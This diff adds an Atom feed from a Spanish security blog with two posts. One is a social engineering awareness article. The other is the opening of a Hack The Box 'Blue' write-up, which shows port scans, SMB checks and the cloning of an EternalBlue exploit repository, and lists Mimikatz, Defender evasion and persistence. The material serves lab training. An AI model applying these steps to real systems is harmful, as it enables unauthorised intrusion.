@@ -1,0 +1,564 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-20T01:36:32-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">Ingeniería social y cómo protegerse</title><link href="http://localhost:4000/ingenier%C3%ADa-social/" rel="alternate" type="text/html" title="Ingeniería social y cómo protegerse" /><published>2023-01-16T00:00:00-06:00</published><updated>2023-01-16T00:00:00-06:00</updated><id>http://localhost:4000/ingenier%C3%ADa-social</id><content type="html" xml:base="http://localhost:4000/ingenier%C3%ADa-social/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/ingeniería-social2.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;ingeniería-social-y-cómo-protegerse&quot;&gt;Ingeniería social y cómo protegerse&lt;/h2&gt;
+
+&lt;p&gt;La ingeniería social consiste en aquellas técnicas que permitan manipular a una persona para lograr que esta proporcione información relevante o lleve a cabo una acción propuesta por el atacante.&lt;/p&gt;
+
+&lt;p&gt;Es muy importante aprender sobre la ingeniería social ya que es uno de los ataques más utilizados por los cibercriminales hoy en día y por esta razón es que necesitamos capacitarnos, para poder identificar este tipo de ataques y tener más segura nuestra información y la de las empresas.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/ingeniería-social.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Vamos a mencionar algo muy interesante:&lt;/p&gt;
+
+&lt;p&gt;En cualquier cadena de seguridad, los humanos somos casi siempre el eslabón más débil, porque somos susceptibles de todo tipo de tácticas de manipulación.&lt;/p&gt;
+
+&lt;p&gt;Como lo dice aqui arriba nosotros los humanos siempre vamos a ser la parte más débil de una empresa, por el simple hecho de que si no tenemos el concocimiento necesario podemos llegar a poner en riesgo a una empresa o nuestra información, ya que nosotros no poseemos un antivirus que nos indique que estamos ante un ataque de este tipo, tampoco poseemos actualizaciones etc.&lt;/p&gt;
+
+&lt;p&gt;La mejor defensa ante este tipo de ataques es capacitarnos constantemente en temas de ciberseguridad.&lt;/p&gt;
+
+&lt;p&gt;Un software puede ser muy seguro, pero si no poseemos el conocimiento necesario sobre este tipo de ataques es muy probable que ese software sea vulnerado por nuestra culpa.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+
+&lt;img src=&quot;/assets/images/ingeniería-social/manipulados.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Hay muchos ataques de ingeniería social, pero solo miraremos algunos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Phishing&lt;/li&gt;
+  &lt;li&gt;Vishing&lt;/li&gt;
+  &lt;li&gt;Baiting&lt;/li&gt;
+  &lt;li&gt;Adicionales (redes sociales, sms, etc.)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/tipos-ataques.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Phishing:&lt;/p&gt;
+
+&lt;p&gt;Envió de correos suplantando una determinada persona o la suplantación de aplicaciones web. Por lo general este tipo de ataque es uno de los más utilizados a día de hoy.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/phishing.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Vishing:&lt;/p&gt;
+
+&lt;p&gt;Donde el atacante suplanta la identidad de una empresa o de una persona de confianza, con el fin de obtener información personal de sus víctimas. Es lo mismo que el ataque anterior, solo que este es mediante una llamada telefónica.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/vishing.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Baiting:&lt;/p&gt;
+
+&lt;p&gt;Es el caso en el que un atacante deja un dispositivo infectado con malware (por ejemplo, una unidad USB) en algún lugar fácil de encontrar. Esto lo hacen por lo general con etiquetas llamativas, como documentos confidenciales, fotos nopor, y cosas que a las personas les de curiosidad y vayan corriendo a conectarlas a sus computadoras (nunca hagan eso).&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/baiting.jpeg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Adicionales:&lt;/p&gt;
+
+&lt;p&gt;Técnicas de ingeniería social mediante redes sociales, mensajes de texto, etc. Ahora utilizan estos mismos ataques pero haciendo uso de las diferentes redes sociales que existen. En instagram por ejemplo es donde las personas pierden sus cuentas con bastante frecuencia y todo por hacer clic en enlaces que las envian amigos a los cuales ya les comprometieron esas cuentas, o simplemente porque ven un mensaje que dice que cerraran sus cuentas y no esto no es asi, lo unico que hacen al realizar estas acciones es caer en el juego de los ciberdelincuentes.&lt;/p&gt;
+
+&lt;p&gt;Igual realizan las mismas técnicas pero mediante mensajes de texto, haciendose pasar por bancos, o servicios muy conocidos y que son utilizados por casi todas las personas, con el mismo fin de robarse nuestros datos.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/redessociales.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ejemplos de ataques de ingeniería social a grandes Empresas.&lt;/p&gt;
+
+&lt;p&gt;Tomaremos como ejemplo solo 2 empresas:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;RSA&lt;/li&gt;
+  &lt;li&gt;Microsoft&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Miraremos cual fue la metodología que utilizaron los ciberdelincuentse para infiltrarse en estas empresas y obtener la información.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/ingenieriasocialempresas.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;RSA:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Suplantación y envió de correo.&lt;/li&gt;
+  &lt;li&gt;Documento adjunto de Excel.&lt;/li&gt;
+  &lt;li&gt;Uso de datos ’verídicos’ de planilla.&lt;/li&gt;
+  &lt;li&gt;Explotación de vulnerabilidad en flash.&lt;/li&gt;
+  &lt;li&gt;Compromiso de sistema interno.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Como podemos observar primero lograron entrar mediante un &lt;code&gt;phishing&lt;/code&gt;, utilizaron un documento de Excel que contenía código malicioso, el cual al ejecutarse explotaba una vulnerabilidad de flash que había en aquel entonces, y así lograron llegar hasta los sistemas internos de la empresa. Aquí es donde miramos la importancia de que el personal y tanto nosotros mismos estemos muy bien capacitados en todos estos temas para poder evitar este tipo de ataques.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/rsa.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Microsoft:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Llamada telefónica.&lt;/li&gt;
+  &lt;li&gt;Obtención de números de seguridad social de empleados.&lt;/li&gt;
+  &lt;li&gt;Reutilización en proveedores para el acceso a cuentas.&lt;/li&gt;
+  &lt;li&gt;Obtención de información sensible sobre XBOX.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;En este otro ejemplo, miramos que el punto de entrada fue un &lt;code&gt;vishing&lt;/code&gt;, así lograron persuadir y obtener el número de seguro social de los empleados y luego esta información la utilizaron en proveedores que los empleados tenían para obtener el acceso a sus cuentas. En este caso no fue tan crítico porque no comprometieron ningún sistema pero se dio lo que se conoce como data leak ya que se filtró información sobre la nueva Xbox que iba a salir en ese entonces, dando a conocer así las características que iba a poseer dicha consola.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/microsoft.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ahora hablaremos de que técnicas emplean los ciberdelincuentes a la hora de elegir una empresa como objetivo, usan un ataque de ingeniería social dirigido y siguen una metodología para que el ataque sea más efectivo.&lt;/p&gt;
+
+&lt;p&gt;Antes de saber cuál es la metodología que emplean, hay que mencionar que existen dos tipos de ataques de ingeniería social:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Dirigidos&lt;/li&gt;
+  &lt;li&gt;No Dirigidos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Dirigidos:
+Son aquellos ataques en el que se tienes una empresa o una persona como objetivo, siguiendo una metodología para que el ataque logre ser más efectivo. Por ejemplo el ataque que hicieron a la empresa &lt;code&gt;Uber&lt;/code&gt; el cual consistió en un &lt;code&gt;phishing&lt;/code&gt;, y a partir de aquí los ciberdelincuentes lograron vulnerar sus sistemas.&lt;/p&gt;
+
+&lt;p&gt;No Dirigidos:
+Por lo general este tipo de ataque se realiza de manera masiva enviando millones de &lt;code&gt;phishing&lt;/code&gt; a usuarios al azar, con la finalidad de hacerse con la mayor cantidad de información posible y así obtener una recompensa mayor. Cabe mencionar que estos ataques son menos efectivos que los Dirigidos ya que no estudian a fondo su víctima.&lt;/p&gt;
+
+&lt;p&gt;La metodología que utilizan los ciberdelincuentes para un ataque dirigido seria la siguiente:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Investigación sobre la organización y empleados de la misma.&lt;/li&gt;
+  &lt;li&gt;Análisis y planificación de posibles vectores.&lt;/li&gt;
+  &lt;li&gt;Definición de empleados objetivo y análisis en profundidad.&lt;/li&gt;
+  &lt;li&gt;Desarrollo de pretextos y escenarios.&lt;/li&gt;
+  &lt;li&gt;Despliegue de la infraestructura necesaria.&lt;/li&gt;
+  &lt;li&gt;Ejecución de pruebas.&lt;/li&gt;
+  &lt;li&gt;Intrusión en la red interna.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Como observamos siguen una metodología bien elaborada con la finalidad de que el ataque resulte ser muy efectivo para que logren caer los empleados de las empresas y así hacerse con sus datos para luego comprometer toda la empresa. Esto nos lleva a que los empleados de una empresa y nosotros como usuarios de cualquier tecnología debemos estar capacitados en temas de ciberseguridad para así lograr mitigar estos ataques ya que no hay otra manera de evitarlos, la única forma es estar debidamente informados.
+Esta metodología también la utilizan los pentester en ejercicios de red team para simular completamente un ataque de ingeniería social usando las mismas técnicas que un ciberdelincuente, de esta manera estarían preparando al personal de una empresa para cualquier tipo de ataque de este tipo y haciendo más segura la empresa.&lt;/p&gt;
+
+&lt;p&gt;En el primer punto usan técnicas &lt;code&gt;OSINT&lt;/code&gt; para recolectar la mayor cantidad de información posible sobre el objetivo.&lt;/p&gt;
+
+&lt;p&gt;En el segundo ya una vez reunida esa información la analizan y miran cual podría ser el mejor vector de ataque si un &lt;code&gt;phishing&lt;/code&gt;, &lt;code&gt;vishing&lt;/code&gt;, &lt;code&gt;baiting&lt;/code&gt;, etc. o también puede usar todas las que ellos crean convenientes.&lt;/p&gt;
+
+&lt;p&gt;Después lo que hacen es analizar cuál podría ser el empleado o los empleados elegidos para atacar, ya que por ejemplo sería más efectivo si utilizan a alguien de &lt;code&gt;recursos humanos&lt;/code&gt; que si eligen a alguien de &lt;code&gt;IT&lt;/code&gt;, ya que al ser del departamento &lt;code&gt;IT&lt;/code&gt; podría darse cuenta más rápido y evitar que logren comprometer la empresa.&lt;/p&gt;
+
+&lt;p&gt;Aquí en este punto van a ver cómo hacer caer a los empleados, haciéndoles creer que son parte del &lt;code&gt;equipo de soporte&lt;/code&gt; o que son algún &lt;code&gt;proveedor&lt;/code&gt; con la finalidad de que los empleados les den acceso o sus datos para colarse dentro de la empresa.&lt;/p&gt;
+
+&lt;p&gt;Ya en este punto crean todo lo que van a utilizar como por ejemplo en que área dejaran las &lt;code&gt;USB&lt;/code&gt; tiradas en caso de ser un &lt;code&gt;baiting&lt;/code&gt;, si es un &lt;code&gt;phishing&lt;/code&gt; pues elaborar cuidadosamente y lo más parecido posible la plantilla de correo y al sitio donde serán redirigidos los empleados o el documento que van a adjuntar para lograr tener la mayor efectividad.&lt;/p&gt;
+
+&lt;p&gt;Ya aquí ejecutan las &lt;code&gt;pruebas&lt;/code&gt; para ver si serán efectivas y en caso de serla estaríamos llegando al último punto que sería la &lt;code&gt;intrusión&lt;/code&gt; en la red interna de la empresa y ya con esto estarían logrando su objetivo.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/ataquessocial2.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ahora que ya vimos que es y cómo funciona la ingeniería social, es hora de aprender cómo evitar este tipo de ataques, para ello vamos a tener en cuenta un par de consejos:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Cambie la configuración de spam en el correo electrónico:
+No todos los proveedores de correos vienen debidamente configurados así que es nuestra responsabilidad configurarlos correctamente para así poder filtrar la mayor parte de correos y tener un poco más segura nuestra bandeja de entrada.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Investigue la &lt;code&gt;fuente&lt;/code&gt;:
+Siempre que se reciba un enlace, un mensaje, un correo, etc. Es muy importante verificar de donde proviene y no importa si es por parte de un amigo hay que estar seguro que en realidad es el quien n os envía y no un ciberdelincuente que pudo haber quitado el acceso a la cuenta de nuestro amigo.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Si algo parece demasiado bueno para ser cierto, seguramente sea &lt;code&gt;falso&lt;/code&gt;:
+Esto es algo muy común en estos tipos de ataques ya que por lo general te dirán que te ganaste algo sin siquiera estar participando, a partir de este momento deberíamos de alertarnos ya que seguramente se trate de un ataque de ingeniería social, es muy común también que las personas caigan más debido a estas técnicas ya que depende de nuestro nivel de economía en que nos encontremos seremos tentados a caer en este tipo de engaños pero recuerda como dicen por ahí &lt;code&gt;nada es gratis&lt;/code&gt; y si lo es tiene un precio tu &lt;code&gt;información&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Utilice software de &lt;code&gt;seguridad&lt;/code&gt; y confianza:
+Nunca este de mas tener de la mano un buen software antivirus y anti malware, para así tener una mayor protección ante este tipo de ataques, aunque sin duda alguna la mejor defensa siempre será estar concientizado ante este tipo de ataques y sobre ciberseguridad, recuerda la ciberseguridad no es un gasto es una inversión como el seguro de un auto, no adquieres el seguro porque vas a chocar el auto si no que en caso de que suceda estas preparado para lo que pueda pasarle a este, es lo mismo a la hora de invertir en ciberseguridad para tu empresa, no quiere decir que pasaras bajo constate ataque, pero en caso de recibir uno tu personal estará debidamente capacitado y podrán evitar que comprometan la empresa.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Utilice el sentido &lt;code&gt;común&lt;/code&gt;:
+Es algo muy curioso y parece sencillo de usar, pero a veces digo que el sentido común no parece tan común ya que algunos simplemente no lo usan. Siempre hay que estar &lt;code&gt;alerta&lt;/code&gt; ante cualquier &lt;code&gt;msj&lt;/code&gt; sospechoso que recibamos y más si es mediante una &lt;code&gt;red social&lt;/code&gt;, nunca abrir &lt;code&gt;links&lt;/code&gt; que te envíen por ahí a menos que sepas su procedencia, así que ya sabes si recibes algo y no estás seguro es mejor que no hagas clic ya que podrían robar tu información personal o tus cuentas.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Sobre todo y no menos importante informarse y concientizarse sobre &lt;code&gt;ciberseguridad&lt;/code&gt;:
+Creo que este es uno de los puntos más importantes, ya que al menos para mí hoy en día es imprescindible que &lt;code&gt;todos&lt;/code&gt; y si me refiero a todos aquellos que utilicemos un dispositivo para navegar por internet y que poseamos redes sociales, etc. En fin usar cualquier dispositivo tecnológico debemos aprender sobre ciberseguridad ya que la tecnología cada día crece a pasos agigantados y así como salen dispositivos nuevos, redes sociales nuevas y así con cada cosa, también salen nuevos ataques, nuevas técnicas que utilizan los ciberdelincuentes para hacerse con nuestros datos. Por eso es importante que aprendamos ya que al hacerlo sabremos lo peligros a los cuales nos enfrentamos e igual conoceremos multitud de ataques que existen y seremos más cuidadosos a la hora de navegar por internet.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/consejos.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ahora conociendo todo esto nos haremos la siguiente interrogante ¿Por qué es tan peligrosa la ingeniería social?&lt;/p&gt;
+
+&lt;p&gt;La ingeniería social puede ocurrirle a cualquiera, ya sea en persona, por teléfono o en línea, y también es un método bastante fácil cuando se realizan estafas, fraudes u otros delitos. Los &lt;code&gt;ciberdelincuentes&lt;/code&gt; no necesitan tener grandes conocimientos técnicos; solo tienen que ser capaces de engañarle para que les entregues datos sensibles. El hecho de que todos estemos en riesgo hace que sea una estafa potencialmente &lt;code&gt;devastadora&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Las redes sociales han ayudado a los ciberdelincuentes a ser más habilidosos, creando perfiles falsos que parecen ser reales, o incluso suplantando a personas reales. Es importante estar alerta ante perfiles extraños o desconocidos en redes sociales.&lt;/p&gt;
+
+&lt;p&gt;Por estos motivos es uno de los ataques más peligrosos ya que es directamente con el usuario que se trata y no con el software.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/peligro.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ya para ir concluyendo con el post, te dejare un par de herramientas que seguramente te ayudaran a la hora de identificar este tipo de ataques.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https:https://www.virustotal.com/gui/home/upload&quot;&gt;Virus Total&lt;/a&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Es una herramienta muy conocida, y lo que nos permite hacer es identificar archivos maliciosos, enlaces, ip, dominios, etc. Es una herramienta que sin duda alguna debemos tener a la mano para poder identificar de una mejor manera todo aquello de lo que nosotros tengamos duda o sospecha.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/virustotal.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://phishtank.org/&quot;&gt;Phishtank&lt;/a&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Es una web que como su nombre lo indica es un tanque de sitios desde donde se realiza phishing, lo que nos permite hacer es que si tenemos duda de una web y ya fue reportada en el sitio web nos dira si es un phishing o no, en el caso de que no nos arroje información tampoco quiere decir que es seguro, simplmente no este reportada. También nos permite poder reportar una pagina que nosotros estemos seguros que sirve para hacer phishing, aportando nuestro granito de arena a la comunidad.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/phishtank.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://expandurl.net/&quot;&gt;Expandurl&lt;/a&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Es una web sencilla pero muy útil ya que nos permite ver la url final de un enlace acortado, permitiéndonos ver hacia donde nos redirigirá esa url sin necesidad de visitarla.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/expandurl.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://phishingquiz.withgoogle.com/?hl=es-419&quot;&gt;phishingquiz&lt;/a&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Una web creada por google para entrenarnos a la hora de identificar ataques de phishing, en el cual se nos presentara una serie de correos y nosotros deberemos ir tomando decisiones y decidir si se trata de un correo legítimo o phishing. Sin duda alguna una excelente herramienta para ayudarnos a detectar de una mejor manera este tipo de ataques y nos entrenara para fijarnos en aquellos detalles que antes no les prestábamos atención.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ingeniería-social/googlephish.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.&lt;/strong&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Ingeniería Social" /><summary type="html">¿Te gustaría aprender un poco sobre Ingeniería social?, pues toma un refresco y palomitas.</summary></entry><entry><title type="html">Blue - Hack The Box</title><link href="http://localhost:4000/blue-hackthebox/" rel="alternate" type="text/html" title="Blue - Hack The Box" /><published>2023-01-15T00:00:00-06:00</published><updated>2023-01-15T00:00:00-06:00</updated><id>http://localhost:4000/blue-hackthebox</id><content type="html" xml:base="http://localhost:4000/blue-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/Blue_htb.png&quot; alt=&quot;Blue_htb.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Certificaciones a aplicar: OSCP&lt;/p&gt;
+
+&lt;p&gt;Dificultad: Fácil&lt;/p&gt;
+
+&lt;p&gt;Habilidades:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SMB Enumeration&lt;/li&gt;
+  &lt;li&gt;Eternalblue Exploitation (MS17-010) [d4t4s3c Exploit]&lt;/li&gt;
+  &lt;li&gt;Obtaining credentials stored in memory [MIMIKATZ + Windows Defender Evasion] (EXTRA)&lt;/li&gt;
+  &lt;li&gt;Enabling RDP from CrackMapExec (EXTRA)&lt;/li&gt;
+  &lt;li&gt;Windows Persistence techniques (EXTRA)&lt;/li&gt;
+  &lt;li&gt;Windows Persistence - Playing with debugger [When a user opens a program] (EXTRA)&lt;/li&gt;
+  &lt;li&gt;Windows Persistence - Playing with Gflags [When a user closes a program] (EXTRA)&lt;/li&gt;
+  &lt;li&gt;Windows Persistence - Playing with WMI Events [Executing tasks at regular intervals of time] (EXTRA)&lt;/li&gt;
+  &lt;li&gt;Persistence + Windows Defender Evasion [Playing with Ebowla] (EXTRA)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;ip-de-la-maquina&quot;&gt;IP de la Maquina&lt;/h1&gt;
+
+&lt;p&gt;10.10.10.40&lt;/p&gt;
+
+&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;
+
+&lt;p&gt;Identificando el sistema operativo&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whichSystem.py 10.10.10.40
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/sistema_operativo.png&quot; alt=&quot;sistema operativo.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Escaneo de los puertos&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/escaneo.png&quot; alt=&quot;escaneo.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Función extractPorts&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extractPorts allPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/puertos.png&quot; alt=&quot;puertos.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;análisis-de-vulnerabilidades&quot;&gt;Análisis de Vulnerabilidades&lt;/h1&gt;
+
+&lt;p&gt;Buscando versiones y servicios que corren para esos puertos&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p135&lt;/span&gt;,139,445,49152 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/script_nmap.png&quot; alt=&quot;script nmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el puerto 445 esta abierto en el cual corre el servicio SMB y lo analizamos con crackmapexec&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.10.40 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como vemos que es un widows 7 profesional y si el smb esta expuesto puede que sea vulnerable al eternal blue así que vamos a analizar ese puerto primero&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos un script de nmap para verificar si es vulnerable al eternal blue&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;vuln and safe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p445&lt;/span&gt; 10.10.10.40 oN smbVulnscan
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/script_vulnerabilidades.png&quot; alt=&quot;script vulnerabilidades.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En efecto vemos que es vulnerable y nos pone Remote code execution&lt;/p&gt;
+
+&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;
+
+&lt;p&gt;Buscamos un repositorio en github donde se encuentran unos scripts para explotar la vulnerabilidad manualmente, nos dirigimos a la carpeta exploits y nos clonamos el repositorio&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/d4t4s3c/Win7Blue.git
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos dirigimos a la carpeta que acabamos de clonar y buscamos eternal blue scanner y lo ejecutamos&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 eternalblue_scanner.py 10.10.10.40
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/Vulnerable.png&quot; alt=&quot;Vulnerable.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Luego de verificar que es Vulnerable creamos un payload con msf venom&lt;/p&gt;
+
